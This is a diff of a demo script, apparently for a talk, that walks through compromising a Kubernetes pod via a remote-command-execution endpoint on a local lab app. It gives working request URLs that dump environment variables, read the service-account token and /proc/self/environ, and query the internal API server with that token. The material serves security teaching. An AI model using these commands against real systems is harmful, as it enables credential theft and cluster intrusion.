@@ -2,15 +2,33 @@
 
 ### STAGE 1 - COMPROMISE A POD
 
-Our starting point is that we've found a vulnerable web application on the internet with an RCE vulnerability. What can we do from here ? 
+Our starting point is that we've found a vulnerable web application on the internet with an RCE vulnerability. 
+
+At this point all we know is that we have an app that is exposed on port 5000, which we have connected to. 
+
+SLIDE 3
+
+Let's also introduce the Timeline of Doom, which will track how our exploit scope has changed over time. 
+
+SLIDE 4
+
+What can we do from here ? 
 
 So the first thing we might be interested in is looking at the environment variables. Typically containers are configured with environment variables so this might tell us some interesting things.
 
 [ENV](http://localhost/webadmin?cmd=env)
 
-This has told us lots of interesting information. We can see we are running in a Kubernetes cluster, so we are in a container, and we can see the internal address of the API server. 
+This has told us lots of interesting information. We can see we are running in a Kubernetes cluster, so we are in a container, and we can see the internal address of the API server. From this we can also assume the pod running our application is exposing the port via a Kubernetes service. 
 
-SLIDE - Basic container, in Kubernetes cluster, with internal API
+SLIDE 5 - Pod, in Kubernetes cluster, with internal API
+
+Let's also see what we can find out about the network at this point 
+
+[IP](http://localhost/webadmin?cmd=ip%a)
+
+So now we know what IP range our container is in. 
+
+SLIDE 6 - Add pod IP
 
 Let's see what else we can do. By default each pod in Kubernetes has a service token automounted in it, which is associated with the service account which was used to create the pod. You can control this on the service account or pod level using :
 
@@ -18,21 +36,17 @@ Let's see what else we can do. By default each pod in Kubernetes has a service t
 
 [TOKEN](http://localhost/webadmin?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)
 
-It seems our permissions will let us access that. We'll see what we can do now with this token.
+It seems our permissions will let us access that, so let's take a look at our Timeline of Doom now. 
+
+SLIDE 7
 
 It's also worth noting that these first two stages are also possible just with a directory traversal vulnerability since we can do :
 
 [ENV_DIR](http://localhost/webadmin?cmd=cat%20/proc/self/environ)
 
-Let's see what we can find out about the network at this point 
+Let's see what we can get from the internal API server using the token we just found. We're going to try to connect from the app to the internal address of the API server.
 
-[IP](http://localhost/webadmin?cmd=ip%a)
-
-So now we know what IP range our container is in. 
-
-SLIDE - Add container IP
-
-Let's see what we can get from the internal API server using the token we just found :
+SLIDE 8
 
 [API](http://localhost/webadmin?cmd=curl%20--cacert%20/var/run/secrets/kubernetes.io/serviceaccount/ca.crt%20-H%20"Authorization:%20Bearer%20$(cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)"%20https://10.96.0.1/api/v1/namespaces/default/endpoints)
 
